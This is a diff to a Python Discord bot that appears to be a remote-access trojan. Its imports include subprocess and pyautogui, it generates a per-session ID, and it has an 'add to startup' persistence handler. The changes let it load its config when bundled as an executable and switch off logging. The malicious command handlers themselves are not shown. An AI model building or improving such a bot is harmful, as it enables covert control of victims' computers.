@@ -1,6 +1,17 @@
-import os, discord, subprocess, requests, pyautogui, re, shutil, json
+import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
 
-config = json.loads(open("config.json", "r"))
+def resource_path(relative_path):
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.join(os.path.abspath("."), relative_path)
+
+try:
+    config = json.loads(open("config.json", "r").read())
+except:
+    config = json.loads(
+        open(resource_path("config.json"), "r").read()
+    )
+
 intents = discord.Intents.all()
 bot = discord.Client(intents=intents)
 session_id = os.urandom(8).hex()
@@ -153,5 +164,5 @@ async def on_message(message):
             embed = discord.Embed(title="Error", description=f"```Failed to add to startup```", color=0xfafafa)
             await message.reply(embed=embed)
 
-bot.run(token)
+bot.run(token, log_handler=None)
 
